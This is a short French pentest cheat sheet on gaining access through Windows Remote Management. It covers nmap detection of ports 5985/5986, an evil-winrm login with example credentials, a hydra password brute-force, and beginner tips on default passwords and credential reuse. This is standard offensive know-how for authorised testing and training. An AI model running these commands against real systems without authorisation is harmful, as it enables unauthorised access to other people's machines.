# Exploitation WinRM (Windows Remote Management)

## Objectif
Exploiter des faiblesses de configuration ou des mots de passe faibles pour obtenir un accès WinRM non autorisé sur une machine Windows.

---

## Explications vulgarisées
- WinRM permet d'exécuter des commandes à distance sur Windows (équivalent de SSH pour Linux). S'il est mal sécurisé, il peut permettre un accès complet à la machine.
- Souvent utilisé dans les environnements Active Directory pour l'administration à distance.

---

## Schéma de l'exploitation typique

Schéma textuel :
1. Reconnaissance
   ↓
2. Connexion WinRM
   ↓
3. Bruteforce ou test de credentials
   ↓
4. Accès distant à la machine
   ↓
5. Exploitation (exécution de commandes, rebond, exfiltration)

---

## Commandes et étapes essentielles

### 1. Détection du service WinRM
```bash
nmap -p 5985,5986 -sV target.com
```
- **-p 5985,5986** : Ports WinRM (HTTP/HTTPS).
- **-sV** : Détecte la version du service.

### 2. Connexion avec des credentials valides
```bash
evil-winrm -i target.com -u administrator -p password123
```
- **evil-winrm** : Outil pour se connecter à WinRM avec un login/mot de passe.
- **Astuce débutant** : Tester les credentials trouvés lors de la post-exploitation.

### 3. Bruteforce de mots de passe
```bash
hydra -L users.txt -P passwords.txt -s 5985 -V target.com http-winrm
```
- **hydra** : Outil de bruteforce pour tester des combinaisons utilisateurs/mots de passe.

---

## Conseils pour débutants
- Toujours commencer par tester les mots de passe faibles ou par défaut.
- Attention au blocage de compte après plusieurs tentatives.
- Tester les credentials trouvés sur d'autres services (recyclage de mots de passe).
- Lire la documentation de chaque outil pour découvrir des options avancées.

---

## Pour aller plus loin
- [PayloadsAllTheThings - WinRM](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/WinRM%20Methodology)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) 